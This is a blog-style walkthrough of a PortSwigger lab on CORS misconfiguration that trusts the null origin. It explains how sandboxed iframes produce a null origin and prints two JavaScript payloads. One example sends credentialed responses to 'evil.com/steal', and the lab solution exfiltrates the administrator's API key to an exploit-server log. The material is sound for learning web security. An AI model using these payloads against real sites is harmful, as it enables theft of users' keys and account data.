---
title: " PortSwiggerlabs: CORS vulnerability with trusted null origin"
date: 2026-08-18 00:00:00 +0000
categories: [PortSwiggerLabs , Cross-origin resource sharing ]
tags: [PortSwiggerLabs , Cross-origin resource sharing , Challenge , Web_Attacks ]
---


## Scenario : 

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter


## Solution :

Before solving the lab, first let's quickly explain what CORS is and how it can be abused.

In a normal setup, a website can only read data from its own domain, makes sense. So if we login to bank.com, a random evil.com website can't just make a request to one of our website's endpoints (eg bank.com/api/balance/account/1), it should be blocked by the browser.

But sometimes, websites need to share data across domains, for example api.spotify.com will talk to open.spotify.com or something. These are actually different origins (different subdomains = different origins), so CORS is what lets them talk to each other. It's basically telling the server, "I trust requests coming from this origin" (eg open.spotify.com can access api.spotify.com/account/1).

The bug happens when the server doesn't care that much about who can make those requests. 2 classic screw-ups are:

- **Reflecting ANY Origin:**

Here the server just reflects any origin that asks, for example:

```bash
On the Request:   Origin: https://evilsite.com
On the Response:  Access-Control-Allow-Origin: https://evilsite.com
                  Access-Control-Allow-Credentials: true
```

If we find the Allow-Credentials: true, this is huge, since it tells the server to share cookies too.

- **Trusting NULL or sloppy wildcards:**

Some servers trust Origin: null (which attackers can forge via sandboxed iframes) or match subdomains badly (e.g. regex that accepts yourbank.com.evil.com).

So what does "forge via sandboxed iframes" actually mean? The browser doesn't always send a clean origin like https://evil.com. In certain cases it sends the literal string null instead, when the request comes from a context that has no real origin, like a page opened from a local file (file://), some redirects, and most importantly, a sandboxed iframe.

An iframe is just a webpage embedded inside another webpage, and you can add a sandbox attribute to lock it down. The catch: when you sandbox an iframe, the browser strips its origin and treats it as null. So if a server is dumb enough to trust Origin: null, an attacker can deliberately generate that null origin by running their malicious code inside a sandboxed iframe: 

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://yourbank.com/api/account', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
      fetch('https://evil.com/steal?d=' + btoa(data));
    });
  </script>
">
</iframe>
```
Developers sometimes whitelist null because it shows up during local testing and they think it's "safe/internal." But null is not safe, an attacker can produce it on demand. So trusting null is basically leaving a door open with a sign that says "only trusted ghosts allowed," and attackers can dress up as ghosts whenever they want.


Now back to the lab : 

<img width="1709" height="864" alt="image" src="https://github.com/user-attachments/assets/73af3e7f-78b6-46b3-bed6-26330907a6f4" />

Just like the last lab , we first login , and then we check Burp's History : 

<img width="1752" height="758" alt="image" src="https://github.com/user-attachments/assets/421b8087-2afb-4f94-bc18-371d35ed5b94" />

Now bac to Burp : 

<img width="1614" height="658" alt="image" src="https://github.com/user-attachments/assets/fb1abb3b-2038-4449-a1f1-d13e7407b001" />

Same with the Lab before this one , we're interested in the /accountdetails endpoint , send the request to repeater to start our test . 

We first add our New Origin to see if it gets reflected . 

<img width="1495" height="673" alt="image" src="https://github.com/user-attachments/assets/4c4b29f7-4731-4ac4-8753-55c99cc919f0" />

We see that it doesn't get reflected in the response . 

Now let's try with the Null origin : 

<img width="1399" height="685" alt="image" src="https://github.com/user-attachments/assets/5c18280f-a518-4ae4-a8e7-093552aaf82c" />

Perfect NULL Origin is indeed accepted and reflected to us in the response . 

As we said before in case it accepts Null origin , we just put our JS code inside a sandboxed iframe , and it will by default trust it and run it : 

In the previous lab, the server reflected any origin, so we could just run a plain <script> and our origin got whitelisted automatically.

This time, the server is a bit smarter, it doesn't reflect everything. It only trusts Origin: null. So our job is to make our malicious request carry Origin: null.

Remember : 

```text
When you sandbox an iframe, the browser strips its origin and treats it as null.
```

That's exactly the trick being used here. We wrap our attack code inside a sandboxed iframe to force the browser to stamp the request with Origin: null. The server sees null, thinks "yep, that's on my list," and lets us read the response.

Now first let's setup our Malicious Server , the idea here is that we're trying our best to mimic an  attack scenario where the victim will have the vulnerable app open on his browser and at the same time , he will visit the malicious server where we hosted our sandboxed iframe and it will run since it trusts it . 

And finally connect back to our Malicious server using the user's API Key , and since we control the server we just read access log and retrieve the API Key . 

For the code i will use the snippet from PortSwiggerLabs : 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

- **<iframe sandbox="...">**
This is the whole point. The sandbox attribute is what makes the browser treat the iframe's content as having a null origin. But sandboxing by default blocks basically everything, so we have to explicitly re-enable a few capabilities:

- **allow-scripts** → let our JavaScript actually run (otherwise the payload does nothing).
- **allow-top-navigation** → let the iframe redirect the top-level page. We need this because our listener does location = '...' to send the stolen key out. Without it, the redirect gets blocked.
- **allow-forms** → allows form submission (included by the lab; not strictly the star of the show here, but harmless to keep).
- **srcdoc="..."**
Instead of pointing the iframe at some external URL with src, srcdoc lets us write the iframe's HTML inline, right here. So the entire malicious script lives inside this attribute. That's why everything is crammed into one string.

For the Script tag , same as before , 

This is almost identical to the last lab's script. Same flow:

- Fire a GET to /accountDetails
- withCredentials = true → ride on the victim's session
- When the response comes back, ship it to our exploit server

Few things to note that are a bit different : 

- **Full exploit-server URL in the redirect** : Last time we used a relative /log. Here we write the full https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log because the code is running inside a sandboxed iframe on the victim's page, so a relative path wouldn't point to our server. We need the absolute address to send the loot home.

- **encodeURIComponent(this.responseText)** → this wraps the stolen data so it's URL-safe. The account details are JSON (full of characters like {, ", :, spaces) that would break a URL.

- **encodeURIComponent** converts them into safe %XX codes so nothing gets mangled or cut off. It's just good hygiene, makes sure the full key arrives intact in your log.

So the Entire flow is : 

Victim opens our page → our page contains a sandboxed iframe → the browser gives that iframe a null origin → the script inside fires a credentialed request to /accountDetails → the server trusts null, so we're allowed to read the response → we URL-encode the key and redirect to our exploit server's /log → we read it from the access log.

Now to solve this lab , first we put our code inside the Exploit Server given to us by PortSwigger : 

<img width="1684" height="831" alt="image" src="https://github.com/user-attachments/assets/eb8c76c6-447e-4d38-a88c-57752b8c56a9" />

From there we just store it and Deliver the exploit to the victim . 

From there we just check the Access Log , and we should see the Administrator's API Key . 

<img width="1909" height="678" alt="image" src="https://github.com/user-attachments/assets/0a6a52b6-72d9-4816-8180-01e374cf51d6" />

From there we just decode everything using Cyberchef and we should get the API Key : 

<img width="1615" height="824" alt="image" src="https://github.com/user-attachments/assets/83860401-7f45-4eb2-8b95-ce2ee082cfff" />

Now we just specify the API Key and it should solve the lab : 

<img width="1660" height="782" alt="image" src="https://github.com/user-attachments/assets/db7405ea-a702-48c3-8ec9-15b30ebc27cd" />

That was all for this lab , see you in the next one :) 
